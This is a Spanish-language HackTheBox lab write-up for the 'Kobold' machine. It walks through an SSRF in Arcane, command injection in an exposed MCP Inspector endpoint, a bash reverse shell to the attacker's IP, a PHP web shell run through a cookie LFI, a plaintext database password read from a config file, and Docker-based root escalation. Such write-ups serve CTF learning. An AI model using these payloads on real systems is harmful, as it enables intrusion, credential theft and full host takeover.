---
title: "Kobold HTB"
machine: "Kobold"
platform: "HackTheBox"
os: "Linux"
difficulty: "Unknown"
tags: ["LFI", "RCE", "Privesc", "Web"]
retired: true
summary: "- 22 — SSH, OpenSSH 9.6p1 sobre Ubuntu. Versión reciente, difícil de atacar directamente."
draft: false
---
# Enumeration

#### primero empezamos con un escaneos de deteccion de puertos y servicios

```jsx
❯ extractPorts allPorts
─────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     │ File: extractPorts.tmp
─────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ 
   2 │ [*] Extrayendo información...
   3 │ 
   4 │     [t] IP Address: 10.129.48.136
   5 │     [t] Open ports: 22,80,443,3552
   6 │ 
   7 │ [*] Ports copied to clipboard
   8 │ 
─────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

     ~/HTB/Kobold/nmap  ✔  
```

#### luego realizamos un escaneo de detección de versión y scripts predeterminados

**Puertos abiertos:**

- **22** — SSH, OpenSSH 9.6p1 sobre Ubuntu. Versión reciente, difícil de atacar directamente.
- **80** — HTTP nginx, redirige a `https://kobold.htb`. No sirve contenido propio.
- **443** — HTTPS nginx, es el sitio principal. El certificado confirma el dominio `kobold.htb` y también acepta `.kobold.htb` (wildcard), lo que sugiere posibles **subdominios**.
- **3552** — Interesante. Corre un servidor HTTP escrito en **Go**. Sirve una app web (HTML con referencias a `/api/...` y un `app.webmanifest`), lo que indica que es una **aplicación separada**, posiblemente un panel interno o una API.

![image.png](/img/kobold/1.png)

bien me gusta siempre obtener un panorama general con un autorecon en web y luego enumerar mas profundamente lo que hago con la herramienta Finalrecon `sudo python3 [finalrecon.py](http://finalrecon.py/) --url [https://10.129.48.136](https://10.129.48.136/) --full`` 

<aside>
💡

Con esta herramienta se debe apuntar a la ip ya que aunque la agregues al etc host igual no la resuelve 

</aside>

```jsx
[+] Completed in 0:00:20.223234

[+] Exported : /root/.local/share/finalrecon/dumps/fr_10.129.48.136_27-04-2026_13:47:13
❯ ls /root/.local/share/finalrecon/dumps/fr_10.129.48.136_27-04-2026_13\:47\:13/

lsd: /root/.local/share/finalrecon/dumps/fr_10.129.48.136_27-04-2026_13:47:13/: Permission denied (os error 13).

❯ sudo ls /root/.local/share/finalrecon/dumps/fr_10.129.48.136_27-04-2026_13\:47\:13/

1.css.txt	 2.external_urls.txt 3.images.txt	4.javascripts.txt 5.robots.txt 
6.ssl.txt	7.urls_inside_sitemap.txt 8.directory_enum.txt 9.headers.txt 
10.internal_urls.txt 11.ports.txt 12.sitemap.txt 11.urls_inside_js.txt 
12.whois.txt

     ~/FinalRecon  on   master !1  ✔  
```

no sirvió de mucho el internal urls no sirvió para filtrar falsos positivos en una posterior enumeración  

```jsx
❯ curl -sk https://kobold.htb/ | wc -c
3812
```

**Lo que sabemos:**

- Puerto 22 — SSH, sin vector directo
- Puerto 80 — redirige a 443
- Puerto 443 — nginx, sitio estático "Muy pronto", nada en robots/sitemap, fuzzing de directorios y subdominios sin resultados útiles (todo 302)
- Puerto 3552 — app Go con rutas `/api/...` y `app.webmanifest` — **superficie de ataque sin explorar**

explorando 3552 

```jsx
curl -sk http://10.129.48.136:3552/app.webmanifest
curl -sk http://10.129.48.136:3552/_app/immutable/entry/app.DjeIUeIu.js | grep -oP '"/[^"]*"' | sort -u
```

sabemos esto:

Es **Arcane** — una plataforma de gestión de contenedores Docker. Tenemos el mapa completo de rutas. Lo más importante:

- `/login` — panel de autenticación
- `/settings/users` — gestión de usuarios
- `/settings/api-keys` — claves API
- `/api/` — API REST con endpoints propios
- OIDC — autenticación externa

primeros visitamos login donde hay campos de introduccion de texto lo que siempre es interesante 

![image.png](/img/kobold/2.png)

![image.png](/img/kobold/3.png)

Continue con fuzzing y porfin avanzo algo

```jsx
❯ ffuf -u http://10.129.48.136:3552/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,400,401,403 -t 50

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.48.136:3552/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,201,400,401,403
________________________________________________

docs                    [Status: 200, Size: 604, Words: 113, Lines: 21, Duration: 71ms]
openapi.json            [Status: 200, Size: 269043, Words: 3762, Lines: 1, Duration: 114ms]
:: Progress: [269/269] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

     ~/HTB/Kobold/content  ✔  
```

exploramos docs que esta accesoble desde el navegador

![image.png](/img/kobold/4.png)

## enumeration part 2

pase a la fase de explotacion y me fue imposible por lo que volvi sobre mis pasos y note algo **estaba haciendo fuzzin sobre http en vez de sobre https** tambien como pudiste notar al principio me fije que podria haber subdominios y efectivamente 

El punto de inflexión ocurrió al cambiar el vector de ataque hacia el servidor web principal (Nginx en HTTPS) utilizando fuerza bruta para descubrir Virtual Hosts.

- **Comando utilizado:**Bash
    
    `ffuf -u "https://10.129.48.136" -k -H "Host: FUZZ.kobold.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -c -fs 154`
    
- **Resultados obtenidos:**
    - `mcp.kobold.htb` (Size: 466) -> Herramienta Inspector MCP (Node.js).
    - `bin.kobold.htb` (Size: 24402) -> PrivateBin v2.0.2.

Se actualizó el archivo `/etc/hosts` local para enrutar correctamente el tráfico hacia estos nuevos objetivos.

# explotation

investigue y probe muchas cosas y todo lo que he avanzado se resume en esto 

## Identificación de la Vulnerabilidad

Se ha confirmado una vulnerabilidad de **Server-Side Request Forgery (SSRF)** en el componente de gestión de plantillas de la aplicación **Arcane**. El endpoint vulnerable permite a un atacante no autenticado forzar al servidor a realizar peticiones HTTP hacia destinos arbitrarios.

- **Endpoint:** `/api/templates/fetch`
- **Método HTTP:** `GET`
- **Parámetro vulnerable:** `url` (Query String)
- **Nivel de Riesgo:** Crítico (Permite enumeración interna y potencial bypass de seguridad).

---

## Proceso de Explotación Paso a Paso

### Paso A: Verificación de conectividad interna

El primer objetivo fue confirmar si el servidor podía realizar peticiones a su propia interfaz de loopback (`127.0.0.1`). Esto es vital para identificar si el servicio confía en peticiones originadas localmente.

**Comando ejecutado:**

Bash

`curl -i -sk "http://10.129.48.136:3552/api/templates/fetch?url=http://127.0.0.1:3552/api/version"`

**Resultado:** `HTTP/1.1 200 OK`. El servidor respondió con datos de la versión, confirmando que el SSRF es funcional y tiene alcance sobre los servicios internos.

---

### Paso B: Intento de Bypass de Autenticación

Se intentó acceder a información sensible de la infraestructura (entornos de Docker) mediante el túnel del SSRF, asumiendo una posible falta de validación de tokens para peticiones locales.

**Comando ejecutado:**

Bash

`curl -i -sk "http://10.129.48.136:3552/api/templates/fetch?url=http://127.0.0.1:3552/api/environments/1"`

**Resultado:** `HTTP/1.1 502 Bad Gateway`. El detalle del error reveló un `401 Unauthorized`.

- **Análisis técnico:** Aunque la petición se origina internamente, el middleware de autenticación de Arcane sigue activo para `127.0.0.1`. El servidor requiere un `Authorization: Bearer <token>` válido independientemente del origen de la IP.

estuve demasiado tiempo atascado aqui y hay fue cuando recorde que si la explotacion parece imposible no enumeraste lo suficiente por lo que volvere a la enumeracion pd> vuelve atras a enumeracion part 2 luego continua aqui

## Explotación Exitosa: Blind RCE en MCP Inspector

El subdominio `mcp.kobold.htb` exponía el endpoint `/api/mcp/connect`, el cual permite configurar conexiones a servidores mediante comandos de sistema. A través de una metodología de prueba y error basada en las respuestas de error de la API, se estructuró el payload correcto.

- **Intento 1:** Faltaba la estructura principal (`serverConfig is required`).
- **Intento 2:** Faltaba el identificador (`serverId is required`).
- **Intento 3 (Confirmación RCE):**JSON
    
    ```jsx
    {
      "serverId": "exploit",
      "serverConfig": {
        "command": "bash",
        "args": ["-c", "id"]
      }
    }
    ```
    
    El servidor devolvió el error `MCP error -32000: Connection closed`, lo que confirmó que el comando `bash` se ejecutó correctamente y el proceso finalizó de inmediato, evidenciando un **Blind RCE**.
    

## Obtención y Estabilización de Shell

Confirmada la vulnerabilidad, se procedió a inyectar una reverse shell interactiva hacia la máquina atacante.

- **Payload final inyectado:**Bash
    
    ```jsx
    curl -i -s -k -X POST "https://mcp.kobold.htb/api/mcp/connect" \
         -H "Content-Type: application/json" \
         -d '{
               "serverId": "exploit",
               "serverConfig": {
                 "command": "bash",
                 "args": ["-c", "bash -i >& /dev/tcp/10.10.15.132/4444 0>&1"]
               }
             }
    ```
    
- **Resultado:** Se recibió una conexión entrante en el listener local de Netcat (`nc -nlvp 4444`). Se obtuvo acceso inicial como el usuario de bajos privilegios **`ben`** en el directorio `/usr/local/lib/node_modules/@mcpjam/inspector`.

![image.png](/img/kobold/5.png)

un poco de busqueda y encontramos la usersflag

![image.png](/img/kobold/6.png)

# Privilege scalation

aqui estuve mucho tiempo enumerando pero creo que encontre algo verificando mi id observe que pertenecia a un grupo poco comun ya solo fue seguir la pista para toparme de frente con algo interesante

```jsx
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ find / -group operator 2>/dev/null
<cpjam/inspector$ find / -group operator 2>/dev/null      
/privatebin-data
/privatebin-data/certs
/privatebin-data/certs/key.pem
/privatebin-data/certs/cert.pem
/privatebin-data/data
/privatebin-data/data/purge_limiter.php
/privatebin-data/data/bd
/privatebin-data/data/bd/b5
/privatebin-data/data/.htaccess
/privatebin-data/data/e3
/privatebin-data/data/traffic_limiter.php
/privatebin-data/data/salt.php
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ 
```

bien como tengo permiso de escritura en el grupo operador puedo escribir archivos maliciosos dentro y anteriormente descubri una vulnerabilidad LFI en la cookie template voy a escribir una web shell desde dentro y tratare de enga;ar a privatebin para ejecutarla **:** Esto nos dará una shell *dentro* del contenedor de Docker. A menudo, los contenedores tienen variables de entorno con contraseñas de bases de datos o tienen el temido `docker.sock` montado, lo que nos permitiría saltar a `root` en la máquina principal.

**intento 1**

```jsx
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ ls -la /privatebin-data/data/
<es/@mcpjam/inspector$ ls -la /privatebin-data/data/      
total 36
drwxrwxrwx 5 root   operator 4096 Mar 15 21:23 .
drwxrwx--- 5 root   operator 4096 Mar 15 21:23 ..
-rwxrwxrwx 1 root   operator   19 Feb 16 08:29 .htaccess
drwx------ 3 nobody       82 4096 Mar 15 21:23 12
drwxrwxrwx 3 root   operator 4096 Mar 15 21:23 bd
drwx------ 3 root   operator 4096 Mar 15 21:23 e3
-rwxrwxrwx 1 root   operator   47 Mar  4 12:49 purge_limiter.php
-rwxrwxrwx 1 root   operator  522 Feb 16 08:29 salt.php
-rw-r----- 1 root   operator  132 Feb 16 08:34 traffic_limiter.php

ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ echo '<?php echo "\n[+] EXPLOIT_SUCCESS [+]\n"; system($_GET["cmd"]); ?>' > /privatebin-data/data/pwn.php
<($_GET["cmd"]); ?>' > /privatebin-data/data/pwn.php    
  
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ curl -s "http://127.0.0.1:8080/" -b "template=../data/pwn" -G --data-urlencode "cmd=id" | grep -i -E "uid|EXPLOIT"
<-data-urlencode "cmd=id" | grep -i -E "uid|EXPLOIT"      
[+] EXPLOIT_SUCCESS [+]
uid=65534(nobody) gid=82(www-data) groups=82(www-data)

ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ curl -s "http://127.0.0.1:8080/" -b "template=../../../../../../srv/data/pwn" -G --data-urlencode "cmd=id" | grep -i -E "uid|EXPLOIT"
<-data-urlencode "cmd=id" | grep -i -E "uid|EXPLOIT"      
[+] EXPLOIT_SUCCESS [+]
uid=65534(nobody) gid=82(www-data) groups=82(www-data)
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ 
```

Acabo de cruzar la frontera y ahora estás ejecutando comandos **dentro del contenedor Docker de PrivateBin** como el usuario `nobody` (o `www-data`, que es el usuario del servidor web interno).

fui directo a leer la configuracion nativa de privatebing y Bingo! credenciales en texto plano 

```jsx
obold:/usr/local/lib/node_modules/@mcpjam/inspector$ curl -s "http://127.0.0.1:8080/" -b "template=../data/pwn" -G --data-urlencode "cmd=find / -name conf.php -exec cat {} + 2>/dev/null" | grep -v "^;" | grep -v "^$" | sed -n '/\[+\] EXPLOIT_SUCCESS \[+\]/,$p'
<-v "^$" | sed -n '/\[+\] EXPLOIT_SUCCESS \[+\]/,$p'      
[+] EXPLOIT_SUCCESS [+]
[main]
discussion = true
opendiscussion = false
password = true
fileupload = false
burnafterreadingselected = false
defaultformatter = "plaintext"
sizelimit = 10000000
templateselection = true
availabletemplates[] = "bootstrap5"
availabletemplates[] = "bootstrap"
availabletemplates[] = "bootstrap-page"
availabletemplates[] = "bootstrap-dark"
availabletemplates[] = "bootstrap-dark-page"
availabletemplates[] = "bootstrap-compact"
availabletemplates[] = "bootstrap-compact-page"
languageselection = false
[expire]
default = "1week"
[expire_options]
5min = 300
10min = 600
1hour = 3600
1day = 86400
1week = 604800
1month = 2592000
1year = 31536000
never = 0
[formatter_options]
plaintext = "Plain Text"
syntaxhighlighting = "Source Code"
markdown = "Markdown"
[traffic]
limit = 10
[purge]
limit = 300
batchsize = 10
[model]
class = Filesystem
[model_options]
dir = PATH "data"
[main]
discussion = true
opendiscussion = false
password = true
fileupload = false
burnafterreadingselected = false
defaultformatter = "plaintext"
sizelimit = 10000000
templateselection = true
availabletemplates[] = "bootstrap5"
availabletemplates[] = "bootstrap"
availabletemplates[] = "bootstrap-page"
availabletemplates[] = "bootstrap-dark"
availabletemplates[] = "bootstrap-dark-page"
availabletemplates[] = "bootstrap-compact"
availabletemplates[] = "bootstrap-compact-page"
languageselection = false
[expire]
default = "1week"
[expire_options]
5min = 300
10min = 600
1hour = 3600
1day = 86400
1week = 604800
1month = 2592000
1year = 31536000
never = 0
[formatter_options]
plaintext = "Plain Text"
syntaxhighlighting = "Source Code"
markdown = "Markdown"
[traffic]
limit = 10
[purge]
limit = 300
batchsize = 10
[model]
class = Filesystem
[model_options]
dir = PATH "data"
[model]
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
tbl = "privatebin_"    ; table prefix
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
opt[12] = true   ; PDO::ATTR_PERSISTENT
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

aqui sabemos que la reutilizacion de contrase;as es el pan de cada dia aunque en este caso no sirvio pero se que pertenezco a un grupo raro investigare mas a fondo pd> llevo 2 horas tratando diferenes cosas y nada 

bien al final si me funciono la reutilizacion de las credenciales XD pero para la pagina del arcane

![image.png](/img/kobold/7.png)

a partir de aqui es crear un docker con la imagen del sistema original pero dandote el usuario 0 root entrar en el docker y pedir la bandera en la terminal 

![image.png](/img/kobold/8.png)

con esto despues de muchas horas **mi primera maquina activa ha sido hackeada**
